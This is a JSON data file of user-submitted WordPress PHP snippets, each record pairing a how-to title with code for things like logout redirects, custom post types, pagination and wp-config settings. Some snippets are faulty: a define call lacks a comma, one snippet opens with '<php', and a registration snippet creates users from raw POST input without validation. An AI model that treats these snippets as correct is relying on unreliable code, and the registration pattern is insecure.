    "description": "$current_user = wp_get_current_user(); echo($current_user->user_login);\n",
    "reg_date": "2021-10-12T10:21:10.000Z"
  },
  {
    "id": 5208,
    "keyword": null,
    "link": null,
    "title": " wordpress global variable not working",
    "description": "global $g_value;   //declare it global even before assigning it., this should fix it.  $g_value = 'something'; echo $g_value;  function get_value() {     global $g_value;     print $g_value; }  echo get_value();\n",
    "reg_date": "2021-10-12T10:21:10.000Z"
  },
  {
    "id": 5209,
    "keyword": null,
    "link": null,
    "title": " wordpress https too many redirects",
    "description": "define('WP_HOME','https://mywebsite.com'); define('WP_SITEURL','https://mywebsite.com'); $_SERVER['HTTPS'] = 'on'; \nIssue was solved by removing the .htaccess file as .htaccess files was containing <FilesMatch \".(phtml|php|PhP|php5|suspected)$\"> Order Allow,Deny Deny from all </FilesMatch>   reference :  https://cwiki.apache.org/confluence/display/HTTPD/ClientDeniedByServerConfiguration\ndefine('WP_HOME','http://example.com'); define('WP_SITEURL','http://example.com'); \nif (strpos($_SERVER['HTTP_X_FORWARDED_PROTO'], 'https') !== false)    $_SERVER['HTTPS']='on';\n",
    "reg_date": "2021-10-12T10:21:10.000Z"
  },
  {
    "id": 5210,
    "keyword": null,
    "link": null,
    "title": " wordpress if admin",
    "description": "<?php if(current_user_can('editor')) { ?>      <!-- Stuff here for editors --> <?php } ?>  <?php if(current_user_can('administrator')) { ?>     <!-- Stuff here for administrators --> <?php } ?> \n",
    "reg_date": "2021-10-12T10:21:10.000Z"
  },
  {
    "id": 5211,
    "keyword": null,
    "link": null,
    "title": " wordpress if is in category",
    "description": "// Find out in Wordpress (with PHP) if a single/page is in a chosen category if (in_category('fruit')) {     echo \"This single/page is in category 'fruit'.\"; }\n",
    "reg_date": "2021-10-12T10:21:10.000Z"
  },
  {
    "id": 5212,
    "keyword": null,
    "link": null,
    "title": " wordpress if is in categroy",
    "description": "// Find out in Wordpress if a single/page is in a chosen category if (in_category('fruit')) {     echo \"This single/page is in category 'fruit'.\"; }\n",
    "reg_date": "2021-10-12T10:21:10.000Z"
  },
  {
    "id": 5213,
    "keyword": null,
    "link": null,
    "title": " wordpress if thumbnail show else",
    "description": "<?php if ( has_post_thumbnail() ) { the_post_thumbnail(); } else { ?> <img src=\"<?php bloginfo('template_directory'); ?>/images/default-image.jpg\" alt=\"<?php the_title(); ?>\" /> <?php } ?> \n",
    "reg_date": "2021-10-12T10:21:11.000Z"
  },
  {
    "id": 5214,
    "keyword": null,
    "link": null,
    "title": " wordpress image text acf",
    "description": "<?php  $image = get_field('image'); if( !empty( $image ) ): ?>     <img src=\"<?php echo esc_url($image['url']); ?>\" alt=\"<?php echo esc_attr($image['alt']); ?>\" /> <?php endif; ?>\n<?php $image = get_field('image'); if( $image ):      // Image variables.     $url = $image['url'];     $title = $image['title'];     $alt = $image['alt'];     $caption = $image['caption'];      // Thumbnail size attributes.     $size = 'thumbnail';     $thumb = $image['sizes'][ $size ];     $width = $image['sizes'][ $size . '-width' ];     $height = $image['sizes'][ $size . '-height' ];      // Begin caption wrap.     if( $caption ): ?>         <div class=\"wp-caption\">     <?php endif; ?>      <a href=\"<?php echo esc_url($url); ?>\" title=\"<?php echo esc_attr($title); ?>\">         <img src=\"<?php echo esc_url($thumb); ?>\" alt=\"<?php echo esc_attr($alt); ?>\" />     </a>      <?php      // End caption wrap.     if( $caption ): ?>         <p class=\"wp-caption-text\"><?php echo esc_html($caption); ?></p>         </div>     <?php endif; ?> <?php endif; ?>\n",
    "reg_date": "2021-10-12T10:21:11.000Z"
  },
  {
    "id": 5215,
    "keyword": null,
    "link": null,
    "title": " wordpress is admin",
    "description": "if ( current_user_can('administrator') ) {} // also others than admin w same capabilities if ( is_user_admin() ){} // if it is admin if ( is_admin() ){} //if the view is not the admin interface but the theme\n// Determines whether the current request is for an  // administrative interface page. is_admin()\n",
    "reg_date": "2021-10-12T10:21:11.000Z"
  },
  {
    "id": 5216,
    "keyword": null,
    "link": null,
    "title": " wordpress is archive",
    "description": "// Returns true if wordpress is on an archive page is_archive(); // For posts only is_post_type_archive( $post_types ); // For a specific post type // example: if (is_post_type_archive( 'news' )){ /* */ }\n",
    "reg_date": "2021-10-12T10:21:11.000Z"
  },
  {
    "id": 5217,
    "keyword": null,
    "link": null,
    "title": " wordpress is home page",
    "description": "if ( is_front_page() ) :     get_header( 'front' ); else :     get_header(); endif;\n// Determines whether the query is for the blog homepage. is_home()\nis_home()\n",
    "reg_date": "2021-10-12T10:21:11.000Z"
  },
  {
    "id": 5218,
    "keyword": null,
    "link": null,
    "title": " wordpress logout link",
    "description": "<a href=\"<?php echo wp_logout_url( home_url() ); ?>\">Logout</a> \n// on your theme -> functions.php --> add_action('wp_logout','auto_redirect_after_logout'); function auto_redirect_after_logout(){   wp_safe_redirect( home_url() );   exit; }\n<a href=\"<?php echo wp_logout_url( get_permalink() ); ?>\" title=\"Logout\">Logout</a> \nadd_action('wp_logout','auto_redirect_after_logout');  function auto_redirect_after_logout(){   wp_safe_redirect( home_url() );   exit; }\nwp_logout()\n",
    "reg_date": "2021-10-12T10:21:11.000Z"
  },
  {
    "id": 5219,
    "keyword": null,
    "link": null,
    "title": " wordpress logout redirect to home",
    "description": "// On functions.php of your child theme or in a code snippet: add_action('wp_logout','auto_redirect_after_logout'); function auto_redirect_after_logout(){   wp_redirect( home_url() );   exit(); }\n",
    "reg_date": "2021-10-12T10:21:11.000Z"
  },
  {
    "id": 5220,
    "keyword": null,
    "link": null,
    "title": " wordpress logout to home page",
    "description": "<a href=\"<?php echo wp_logout_url( home_url() ); ?>\">Logout</a> \n// on your theme -> functions.php --> add_action('wp_logout','auto_redirect_after_logout'); function auto_redirect_after_logout(){   wp_safe_redirect( home_url() );   exit; }\n",
    "reg_date": "2021-10-12T10:21:11.000Z"
  },
  {
    "id": 5221,
    "keyword": null,
    "link": null,
    "title": " wordpress loop first two post",
    "description": "<div class=\"col-lg-12\">     <div class=\"row\">              <?php if ( have_posts() ) : ?>             <?php if ( in_category( 'Featured' ) ) : /* Start the Featured Loop */ ?>                  <?php while( have_posts() ) : the_post(); ?>                  <?php if( $wp_query->current_post == 0 ) {                  //open wide column wrapper div// ?>                 <?php } ?>                  <?php if( $wp_query->current_post <= 1 ) {                  get_template_part( 'content', 'featured' );                 //insert large post// ?>                 <?php } ?>                  <?php if( $wp_query->current_post == 1 || $wp_query->current_post <= 1 && $wp_query->current_post == $wp_query->post_count-1 ) {                  //close wide column div// ?>                 <?php } ?>                  <?php if( $wp_query->current_post == 2 || $wp_query->current_post <= 1 && $wp_query->current_post == $wp_query->post_count-1 ) {                  //open narrow column wrapper div// ?>                 <?php } ?>                  <?php if( $wp_query->current_post >= 2 ) {                  get_template_part( 'content', 'featuredside' );                 //insert small post//?>                 <?php } ?>                  <?php if( $wp_query->current_post == 4 || $wp_query->current_post == $wp_query->post_count-1 ) {                  //close narrow column div// ?>                 <?php } ?>                  <?php endwhile; ?>                      <?php endif; ?>                  <?php endif; ?>      </div> <!--/.row--> </div> <!--/.col-lg-12-->\n",
    "reg_date": "2021-10-12T10:21:11.000Z"
  },
  {
    "id": 5222,
    "keyword": null,
    "link": null,
    "title": " wordpress loop over posts but exclude current post",
    "description": "$args = array(     'numberposts' => 5,     'offset' => 0,     'category' => 7,     'post__not_in' => array( $post->ID ) ); $myposts2 = get_posts($args);\n",
    "reg_date": "2021-10-12T10:21:11.000Z"
  },
  {
    "id": 5223,
    "keyword": null,
    "link": null,
    "title": " wordpress loop permalink",
    "description": "<?php echo get_post_permalink() ?>\n<?php the_permalink() ?>\n",
    "reg_date": "2021-10-12T10:21:12.000Z"
  },
  {
    "id": 5224,
    "keyword": null,
    "link": null,
    "title": " wordpress make custom role",
    "description": "/* Create Staff Member User Role */ add_role(     'staff_member', //  System name of the role.     __( 'Staff Member'  ), // Display name of the role.     array(         'read'  => true,         'delete_posts'  => true,         'delete_published_posts' => true,         'edit_posts'   => true,         'publish_posts' => true,         'upload_files'  => true,         'edit_pages'  => true,         'edit_published_pages'  =>  true,         'publish_pages'  => true,         'delete_published_pages' => false, // This user will NOT be able to  delete published pages.     ) );\n",
    "reg_date": "2021-10-12T10:21:12.000Z"
  },
  {
    "id": 5225,
    "keyword": null,
    "link": null,
    "title": " wordpress max memory limit",
    "description": "define( 'WP_MAX_MEMORY_LIMIT', '256M' ); //BACK-END MEMORY LIMIT define('WP_MEMORY_LIMIT', '128M'); //FRONT-END MEMORY LIMIT\n",
    "reg_date": "2021-10-12T10:21:12.000Z"
  },
  {
    "id": 5226,
    "keyword": null,
    "link": null,
    "title": " wordpress max post revision",
    "description": "// Inside wp-config.php -> LIMIT POST REVISIONS to 8 define( 'WP_POST_REVISIONS', 8 );\n",
    "reg_date": "2021-10-12T10:21:12.000Z"
  },
  {
    "id": 5227,
    "keyword": null,
    "link": null,
    "title": " wordpress meta query relation",
    "description": "$results = query_posts( array(     'post_type' => 'event_id',     'meta_query' => array(         'relation' => 'AND',         array(             'relation' => 'OR',             array(                 'key' => 'primary_user_id',                 'value' => $user_id             ),             array(                 'key' => 'secondary_user_id',                 'value' => $user_id             )         ),         array(             'key' => 'date',             'value' => array( $start_date, $end_date ),             'type' => 'DATETIME',             'compare' => 'BETWEEN'         )     ) ) );\n",
    "reg_date": "2021-10-12T10:21:12.000Z"
  },
  {
    "id": 5228,
    "keyword": null,
    "link": null,
    "title": " wordpress notice",
    "description": "// for success <div class=\"notice notice-success is-dismissible\">         <p><?php _e( 'Done!', 'sample-text-domain' ); ?></p> </div>    // for error   <div class=\"notice notice-error is-dismissible \">         <p><?php _e( 'Error message here!', 'sample-text-domain' ); ?></p> </div>   \n# More advance version  function sample_admin_notice__error() {     $class = 'notice notice-error';     $message = __( 'Irks! An error has occurred.', 'sample-text-domain' );       printf( '<div class=\"%1$s\"><p>%2$s</p></div>', esc_attr( $class ), esc_html( $message ) );  } add_action( 'admin_notices', 'sample_admin_notice__error' );\nfunction sample_admin_notice__success() {     ?>     <div class=\"notice notice-success is-dismissible\">         <p><?php _e( 'Done!', 'sample-text-domain' ); ?></p>     </div>     <?php } add_action( 'admin_notices', 'sample_admin_notice__success' ); \n",
    "reg_date": "2021-10-12T10:21:12.000Z"
  },
  {
    "id": 5229,
    "keyword": null,
    "link": null,
    "title": " wordpress paginate links",
    "description": "<?php  // Full wp pagination example $paged = ( get_query_var( 'paged' ) ) ? get_query_var( 'paged' ) : 1;      $args = array(         'post_type' => 'blog',         'posts_per_page' => 10,         'paged' => $paged     );      // The Query     $the_query = new WP_Query( $args );      // The Loop     if ( $the_query->have_posts() ) {         while ( $the_query->have_posts() ) {           $the_query->the_post();           the_permalink();            the_title();            the_excerpt();         }     }      ?>      <div class=\"pagination\">         <?php             echo paginate_links( array(                 'base'         => str_replace( 999999999, '%#%', esc_url( get_pagenum_link( 999999999 ) ) ),                 'total'        => $the_query->max_num_pages,                 'current'      => max( 1, get_query_var( 'paged' ) ),                 'format'       => '?paged=%#%',                 'show_all'     => false,                 'type'         => 'plain',                 'end_size'     => 2,                 'mid_size'     => 1,                 'prev_next'    => true,                 'prev_text'    => sprintf( '<i></i> %1$s', __( 'Newer Posts', 'text-domain' ) ),                 'next_text'    => sprintf( '%1$s <i></i>', __( 'Older Posts', 'text-domain' ) ),                 'add_args'     => false,                 'add_fragment' => '',             ) );         ?>     </div>\n<?php      echo paginate_links( array(         'mid_size'  => 3,         'prev_text' => __( '&laquo; Prev', 'textdomain' ),         'next_text' => __( 'Next &raquo;', 'textdomain' ),       ) );  ?>\n<?php  $paged = (get_query_var('paged')) ? get_query_var('paged') : 1;  $data= new WP_Query(array(     'post_type'=>'YOUR_POST_TYPE', // your post type name     'posts_per_page' => 3, // post per page     'paged' => $paged, ));  if($data->have_posts()) :     while($data->have_posts())  : $data->the_post();             // Your code     endwhile;      $total_pages = $data->max_num_pages;      if ($total_pages > 1){          $current_page = max(1, get_query_var('paged'));          echo paginate_links(array(             'base' => get_pagenum_link(1) . '%_%',             'format' => '/page/%#%',             'current' => $current_page,             'total' => $total_pages,             'prev_text'    => __('&laquo; prev'),             'next_text'    => __('next &raquo;'),         ));     }     ?>     <?php else :?> <h3><?php _e('404 Error&#58; Not Found', ''); ?></h3> <?php endif; ?> <?php wp_reset_postdata();?> \n",
    "reg_date": "2021-10-12T10:21:13.000Z"
  },
  {
    "id": 5230,
    "keyword": null,
    "link": null,
    "title": " wordpress plugin deactivate from database",
    "description": "Wordpress plugin deactivate from database  Step 1: Open phpMyAdmin  Step 2: Select WordPress Database  Step 3: Open options Table  Step 4: Edit active_plugins Value enter a:0:{} in the option_value box  https://kinsta.com/knowledgebase/disable-wordpress-plugins/\n",
    "reg_date": "2021-10-12T10:21:13.000Z"
  },
  {
    "id": 5231,
    "keyword": null,
    "link": null,
    "title": " wordpress post revisions config",
    "description": "// on wp-config.php --> define( 'WP_POST_REVISIONS', 5 ); // Save max 5 revisions define('AUTOSAVE_INTERVAL', 120 ); // Save revision automatically after 2 minutes (default 60 sec.)\n// Inside wp-config.php -> LIMIT POST REVISIONS to 8 define( 'WP_POST_REVISIONS', 8 );\n",
    "reg_date": "2021-10-12T10:21:13.000Z"
  },
  {
    "id": 5232,
    "keyword": null,
    "link": null,
    "title": " wordpress print all categories",
    "description": "$categories = get_categories(); foreach($categories as $category) {    echo '<div class=\"col-md-4\"><a href=\"' . get_category_link($category->term_id) . '\">' . $category->name . '</a></div>'; }\n",
    "reg_date": "2021-10-12T10:21:13.000Z"
  },
  {
    "id": 5233,
    "keyword": null,
    "link": null,
    "title": " wordpress print post data",
    "description": "echo '<pre>'; \tprint_r(get_post_custom($post_id)); echo '</pre>';\n",
    "reg_date": "2021-10-12T10:21:13.000Z"
  },
  {
    "id": 5234,
    "keyword": null,
    "link": null,
    "title": " wordpress programmatically logout",
    "description": "<a href=\"<?php echo wp_logout_url( get_permalink() ); ?>\" title=\"Logout\">Logout</a> \nwp_destroy_current_session(); wp_clear_auth_cookie(); wp_set_current_user( 0 ); \n",
    "reg_date": "2021-10-12T10:21:13.000Z"
  },
  {
    "id": 5235,
    "keyword": null,
    "link": null,
    "title": " wordpress query orderby name",
    "description": "query_posts( array(      'post_type'      => 'page',     'posts_per_page' => -1,     'orderby'        => 'title',     'order'          => 'ASC' ) );\n",
    "reg_date": "2021-10-12T10:21:13.000Z"
  },
  {
    "id": 5236,
    "keyword": null,
    "link": null,
    "title": " wordpress register post type",
    "description": "/**  * Register a custom post type called \"book\".  *  * @see get_post_type_labels() for label keys.  */ function wpdocs_codex_book_init() {     $labels = array(         'name'                  => _x( 'Books', 'Post type general name', 'textdomain' ),         'singular_name'         => _x( 'Book', 'Post type singular name', 'textdomain' ),         'menu_name'             => _x( 'Books', 'Admin Menu text', 'textdomain' ),         'name_admin_bar'        => _x( 'Book', 'Add New on Toolbar', 'textdomain' ),         'add_new'               => __( 'Add New', 'textdomain' ),         'add_new_item'          => __( 'Add New Book', 'textdomain' ),         'new_item'              => __( 'New Book', 'textdomain' ),         'edit_item'             => __( 'Edit Book', 'textdomain' ),         'view_item'             => __( 'View Book', 'textdomain' ),         'all_items'             => __( 'All Books', 'textdomain' ),         'search_items'          => __( 'Search Books', 'textdomain' ),         'parent_item_colon'     => __( 'Parent Books:', 'textdomain' ),         'not_found'             => __( 'No books found.', 'textdomain' ),         'not_found_in_trash'    => __( 'No books found in Trash.', 'textdomain' ),         'featured_image'        => _x( 'Book Cover Image', 'Overrides the &ldquo;Featured Image&rdquo; phrase for this post type. Added in 4.3', 'textdomain' ),         'set_featured_image'    => _x( 'Set cover image', 'Overrides the &ldquo;Set featured image&rdquo; phrase for this post type. Added in 4.3', 'textdomain' ),         'remove_featured_image' => _x( 'Remove cover image', 'Overrides the &ldquo;Remove featured image&rdquo; phrase for this post type. Added in 4.3', 'textdomain' ),         'use_featured_image'    => _x( 'Use as cover image', 'Overrides the &ldquo;Use as featured image&rdquo; phrase for this post type. Added in 4.3', 'textdomain' ),         'archives'              => _x( 'Book archives', 'The post type archive label used in nav menus. Default &ldquo;Post Archives&rdquo;. Added in 4.4', 'textdomain' ),         'insert_into_item'      => _x( 'Insert into book', 'Overrides the &ldquo;Insert into post&rdquo;/&rdquo;Insert into page&rdquo; phrase (used when inserting media into a post). Added in 4.4', 'textdomain' ),         'uploaded_to_this_item' => _x( 'Uploaded to this book', 'Overrides the &ldquo;Uploaded to this post&rdquo;/&rdquo;Uploaded to this page&rdquo; phrase (used when viewing media attached to a post). Added in 4.4', 'textdomain' ),         'filter_items_list'     => _x( 'Filter books list', 'Screen reader text for the filter links heading on the post type listing screen. Default &ldquo;Filter posts list&rdquo;/&rdquo;Filter pages list&rdquo;. Added in 4.4', 'textdomain' ),         'items_list_navigation' => _x( 'Books list navigation', 'Screen reader text for the pagination heading on the post type listing screen. Default &ldquo;Posts list navigation&rdquo;/&rdquo;Pages list navigation&rdquo;. Added in 4.4', 'textdomain' ),         'items_list'            => _x( 'Books list', 'Screen reader text for the items list heading on the post type listing screen. Default &ldquo;Posts list&rdquo;/&rdquo;Pages list&rdquo;. Added in 4.4', 'textdomain' ),     );       $args = array(         'labels'             => $labels,         'public'             => true,         'publicly_queryable' => true,         'show_ui'            => true,         'show_in_menu'       => true,         'query_var'          => true,         'rewrite'            => array( 'slug' => 'book' ),         'capability_type'    => 'post',         'has_archive'        => true,         'hierarchical'       => false,         'menu_position'      => null,         'supports'           => array( 'title', 'editor', 'author', 'thumbnail', 'excerpt', 'comments' ),     );       register_post_type( 'book', $args ); }   add_action( 'init', 'wpdocs_codex_book_init' );\nfunction book_setup_post_type() {     $args = array(         'public'    => true,         'label'     => __( 'Books', 'textdomain' ),         'menu_icon' => 'dashicons-book',     );     register_post_type( 'book', $args ); } add_action( 'init', 'book_setup_post_type' ); \n",
    "reg_date": "2021-10-12T10:21:13.000Z"
  },
  {
    "id": 5237,
    "keyword": null,
    "link": null,
    "title": " wordpress register user php",
    "description": "<php          // register                  $user = (isset($_POST['username']) ? $_POST['username'] : '');         $pass = (isset($_POST['password']) ? $_POST['password'] : '');         $email = (isset($_POST['email']) ? $_POST['email'] : '');          if (!username_exists($user)  && !email_exists($email)) {             $user_id = wp_create_user($user, $pass, $email);             if (!is_wp_error($user_id)) {                 //user has been created                 $user = new WP_User($user_id);                 $user->set_role('do');                 //Redirect                 wp_redirect('URL_where_you_want_redirect');                 exit;             } else {                 //$user_id is a WP_Error object. Manage the error             }         }else{             // user exist         } ?>\n",
    "reg_date": "2021-10-12T10:21:13.000Z"
  },
  {
    "id": 5238,
    "keyword": null,
    "link": null,
    "title": " wordpress remove all dashboard widgets",
    "description": "// Main column (left):  // Browser Update Required $wp_meta_boxes['dashboard']['normal']['high']['dashboard_browser_nag'];  // PHP Update Required $wp_meta_boxes['dashboard']['normal']['high']['dashboard_php_nag'];    // At a Glance $wp_meta_boxes['dashboard']['normal']['core']['dashboard_right_now']; // Right Now $wp_meta_boxes['dashboard']['normal']['core']['network_dashboard_right_now']; // Activity $wp_meta_boxes['dashboard']['normal']['core']['dashboard_activity']; // Site Health Status $wp_meta_boxes['dashboard']['normal']['core']['health_check_status'];   // Side Column (right):  // WordPress Events and News $wp_meta_boxes['dashboard']['side']['core']['dashboard_primary']; // Quick Draft, Your Recent Drafts $wp_meta_boxes['dashboard']['side']['core']['dashboard_quick_press'];  \n",
    "reg_date": "2021-10-12T10:21:13.000Z"
  },
  {
    "id": 5239,
    "keyword": null,
    "link": null,
    "title": " wordpress remove taxonomy metabox",
    "description": "/* If you are manually registering your custom taxonomy via register_taxonomy then you can pass in arguments to control where the metabox appears.  In the example below setting show_ui to false would completely remove the metabox from the edit screen, the quick edit screen, and the admin menu. But if you set show_ui to true you can achieve more nuanced control by then using the show_in_quick_edit and meta_box_cb arguments (setting the later to false hides the metabox on the CPT edit screen as desired). */  register_taxonomy( 'your_custom_taxonomy', array( 'your_custom_post_type' ), $args ); $args = array(     'show_ui'                    => true,     'show_in_quick_edit'         => false,     'meta_box_cb'                => false, ); \n",
    "reg_date": "2021-10-12T10:21:14.000Z"
  },
  {
    "id": 5240,
    "keyword": null,
    "link": null,
    "title": " wordpress shortcode",
    "description": "function create_shortcode(){     return \"<h2>Hello world !</h2>\"; } add_shortcode('my_shortcode', 'create_shortcode'); // Use [my_shortcode]\n<?php echo do_shortcode('[name_of_shortcode parameters=\"\"]'); ?>\nfunction wpdocs_bartag_func( $atts ) {     $atts = shortcode_atts(         array(             'foo' => 'no foo',             'bar' => 'default bar',         ), $atts, 'bartag' );       return 'bartag: ' . esc_html( $atts['foo'] ) . ' ' . esc_html( $atts['bar'] ); } add_shortcode( 'bartag', 'wpdocs_bartag_func' );\nfunction wp_demo_shortcode() {   //Turn on output buffering ob_start(); $code = 'Hello World'; ob_get_clean();   // Output needs to be return return $code; }   // register shortcode add_shortcode('helloworld', 'wp_demo_shortcode'); \n// function that runs when shortcode is called function wpb_demo_shortcode() {    // Things that you want to do.  $message = 'Hello world!';    // Output needs to be return return $message; }  // register shortcode add_shortcode('greeting', 'wpb_demo_shortcode'); \n// function that runs when shortcode is called function wpb_demo_shortcode() {    // Things that you want to do.  $message = 'Hello world!';    // Output needs to be return return $message; }  // register shortcode add_shortcode('greeting', 'wpb_demo_shortcode');  \n",
    "reg_date": "2021-10-12T10:21:14.000Z"
  },
  {
    "id": 5241,
    "keyword": null,
    "link": null,
    "title": " wordpress show notice",
    "description": "// for success <div class=\"notice notice-success is-dismissible\">         <p><?php _e( 'Done!', 'sample-text-domain' ); ?></p> </div>    // for error   <div class=\"notice notice-error is-dismissible \">         <p><?php _e( 'Error message here!', 'sample-text-domain' ); ?></p> </div>   \nfunction sample_admin_notice__success() {     ?>     <div class=\"notice notice-success is-dismissible\">         <p><?php _e( 'Done!', 'sample-text-domain' ); ?></p>     </div>     <?php } add_action( 'admin_notices', 'sample_admin_notice__success' ); \n",
    "reg_date": "2021-10-12T10:21:14.000Z"
  },
  {
    "id": 5242,
    "keyword": null,
    "link": null,
    "title": " wordpress stop redirect to https",
    "description": "// add this to the bottom of your wp-config.php define('FORCE_SSL_ADMIN', false);\n",
    "reg_date": "2021-10-12T10:21:14.000Z"
  },
  {
    "id": 5243,
    "keyword": null,
    "link": null,
    "title": " wordpress the loop",
    "description": "<?php if ( have_posts() ) : while ( have_posts() ) : the_post(); ?>        <h2><?php the_title(); ?></h2>       <?php the_content(); ?>      <?php endwhile; else: ?>        <h2><?php esc_html_e( '404 Error', 'phpforwp' ); ?></h2>       <p><?php esc_html_e( 'Sorry, content not found.', 'phpforwp' ); ?></p>  <?php endif; ?> \n<div class=\"col-lg-12\">     <div class=\"row\">              <?php if ( have_posts() ) : ?>             <?php if ( in_category( 'Featured' ) ) : /* Start the Featured Loop */ ?>                  <?php while( have_posts() ) : the_post(); ?>                  <?php if( $wp_query->current_post == 0 ) {                  //open wide column wrapper div// ?>                 <?php } ?>                  <?php if( $wp_query->current_post <= 1 ) {                  get_template_part( 'content', 'featured' );                 //insert large post// ?>                 <?php } ?>                  <?php if( $wp_query->current_post == 1 || $wp_query->current_post <= 1 && $wp_query->current_post == $wp_query->post_count-1 ) {                  //close wide column div// ?>                 <?php } ?>                  <?php if( $wp_query->current_post == 2 || $wp_query->current_post <= 1 && $wp_query->current_post == $wp_query->post_count-1 ) {                  //open narrow column wrapper div// ?>                 <?php } ?>                  <?php if( $wp_query->current_post >= 2 ) {                  get_template_part( 'content', 'featuredside' );                 //insert small post//?>                 <?php } ?>                  <?php if( $wp_query->current_post == 4 || $wp_query->current_post == $wp_query->post_count-1 ) {                  //close narrow column div// ?>                 <?php } ?>                  <?php endwhile; ?>                      <?php endif; ?>                  <?php endif; ?>      </div> <!--/.row--> </div> <!--/.col-lg-12-->\n",
    "reg_date": "2021-10-12T10:21:14.000Z"
  },
  {
    "id": 5244,
    "keyword": null,
    "link": null,
    "title": " wordpress theme The link you followed has expired.",
    "description": "//Add to functions.php file @ini_set( 'upload_max_size' , '120M' ); @ini_set( 'post_max_size', '120M'); @ini_set( 'max_execution_time', '300' );\nPlace in .htaccess file  php_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300\n",
    "reg_date": "2021-10-12T10:21:14.000Z"
  },
  {
    "id": 5245,
    "keyword": null,
    "link": null,
    "title": " wordpress theme development boilerplate",
    "description": "This is a basic wordpress bootstrap boilerplate  https://github.com/d4rkvent/understrap\n",
    "reg_date": "2021-10-12T10:21:15.000Z"
  },
  {
    "id": 5246,
    "keyword": null,
    "link": null,
    "title": " wordpress thumbnail url",
    "description": "echo get_the_post_thumbnail_url();\n<?php    // ALL parameters are optional. Not needed if you are on WP LOOP   echo get_the_post_thumbnail_url( $the_query->ID, array( 500, 400) ); ?>\n<img src='<?php the_post_thumbnail_url(); ?>'>\n<?php if (has_post_thumbnail( $post->ID ) ): ?>   <?php $image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'single-post-thumbnail' ); ?>   <div id=\"custom-bg\" style=\"background-image: url('<?php echo $image[0]; ?>')\">    </div> <?php endif; ?>\n",
    "reg_date": "2021-10-12T10:21:15.000Z"
  },
  {
    "id": 5247,
    "keyword": null,
    "link": null,
    "title": " wordpress truncate text",
    "description": "echo wp_trim_words( get_the_content(), 100 ); // post content echo wp_trim_words( get_the_excerpt(), 100 ); // post excerpt echo wp_trim_words( get_the_title(), 100 ); // post title \n<?php $my_content = apply_filters( 'the_content', get_the_content() ); $my_content = wp_strip_all_tags($my_content); echo wp_trim_words( $my_content, 55, $moreLink); ?> \n",
    "reg_date": "2021-10-12T10:21:15.000Z"
  },
  {
    "id": 5248,
    "keyword": null,
    "link": null,
    "title": " wordpress turn off php warnings",
    "description": "ini_set('display_errors','Off'); ini_set('error_reporting', E_ALL ); define('WP_DEBUG', false); define('WP_DEBUG_DISPLAY', false); \n",
    "reg_date": "2021-10-12T10:21:15.000Z"
  },
  {
    "id": 5249,
    "keyword": null,
    "link": null,
    "title": " wordpress wp query orderby random",
    "description": "$args = array(     'category_name'  => 'cat1',     'posts_per_page' => 5,     'orderby'        => 'rand', );  $pc = new WP_Query( $args );  \n",
    "reg_date": "2021-10-12T10:21:15.000Z"
  },
  {
    "id": 5250,
    "keyword": null,
    "link": null,
    "title": " wordpress wpdb",
    "description": "<?php // 1st Method - Declaring $wpdb as global and using it to execute an SQL query statement that returns a PHP object global $wpdb; $results = $wpdb->get_results( \"SELECT * FROM {$wpdb->prefix}options WHERE option_id = 1\", OBJECT ); \n<?php  if ( ! defined('ABSPATH') ) {     /** Set up WordPress environment */     require_once( dirname( __FILE__ ) . '/wp-load.php' ); }  global $wpdb; $results = $wpdb->get_results( \"SELECT * FROM table_bame\", OBJECT );  print_r($results);\nglobal $wpdb;\n",
    "reg_date": "2021-10-12T10:21:15.000Z"
  },
  {
    "id": 5251,
    "keyword": null,
    "link": null,
    "title": " wordpress write all error in log",
    "description": "//You can enable WordPress logging adding this to wp-config.php file // Enable WP_DEBUG mode define( 'WP_DEBUG', true );  // Enable Debug logging to the /wp-content/debug.log file define( 'WP_DEBUG_LOG', true );\nerror_log( 'Hello World!' );\n",
    "reg_date": "2021-10-12T10:21:15.000Z"
  },
  {
    "id": 5252,
    "keyword": null,
    "link": null,
    "title": " wp+create custom post type and category",
    "description": "add_action( 'init', 'create_news' ); function create_news () {           register_post_type( 'ecommerces',                 array(                 'labels'        => array(                 'name'          => __( 'Ecommerces' ),                 'singular_name' => __( 'Ecommerce' )                 ),                 'public'   => true,                 'supports' => array ('title', 'editor', 'thumbnail')                 )                 );      register_taxonomy(                 'ecommerce_cat',                 'ecommerces',                 array(                 'labels' => array(                 'name' => 'Ecommerce Categories',                 'add_new_item' => 'Add New Ecommerce Category',                 'new_item_name' => \"New Ecommerce Category\"                 ),                 'show_ui' => true,                 'show_tagcloud' => false,                 'hierarchical' => true,                 'hasArchive' => true                 )                 );      }      if ( function_exists( 'add_theme_support' ) ) {     add_theme_support( 'post-thumbnails' );     set_post_thumbnail_size( 100, 100, true );  }      ?>\nfunction create_posttype() {   register_post_type( 'wpll_product',     array(       'labels' => array(         'name' => __( 'Products' ),         'singular_name' => __( 'Product' )       ),       'public' => true,       'has_archive' => true,       'rewrite' => array('slug' => 'products'),     )   ); } add_action( 'init', 'create_posttype' ); \n",
    "reg_date": "2021-10-12T10:21:15.000Z"
  },
  {
    "id": 5253,
    "keyword": null,
    "link": null,
    "title": " wp+get custom field phpto",
    "description": "<div class=\"about_photo\"> \t\t<?php \t\t$value =get_field('about_photo'); \t\t echo \"<img src='\".$value.\"' width='200px' height='200px'>\"; \t\t ?> </div>\n",
    "reg_date": "2021-10-12T10:21:15.000Z"
  },
  {
    "id": 5254,
    "keyword": null,
    "link": null,
    "title": " wp+get feature image",
    "description": "<?php if (has_post_thumbnail( $post->ID ) ): ?>   <?php $image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'single-post-thumbnail' ); ?>   <div id=\"custom-bg\" style=\"background-image: url('<?php echo $image[0]; ?>')\">    </div> <?php endif; ?>\n<?php \techo get_the_post_thumbnail( $post_id, 'thumbnail' ); ?>\n<?php  /* RETURNS a full image resource as: <img class=\"data...\" src=\"data...\">    ALL parameters are optional. Not needed if you are on WP LOOP */ echo get_the_post_thumbnail( $the_query->ID, array( 500, 400) );  /* USE get_the_post_thumbnail_url() to get only the image url */ ?>\n",
    "reg_date": "2021-10-12T10:21:16.000Z"
  },
  {
    "id": 5255,
    "keyword": null,
    "link": null,
    "title": " wp-config.php repair",
    "description": "define('wp_allow_repair' true)\n",
    "reg_date": "2021-10-12T10:21:16.000Z"
  },
  {
    "id": 5256,
    "keyword": null,
    "link": null,
    "title": " wp-config change url wp-config",
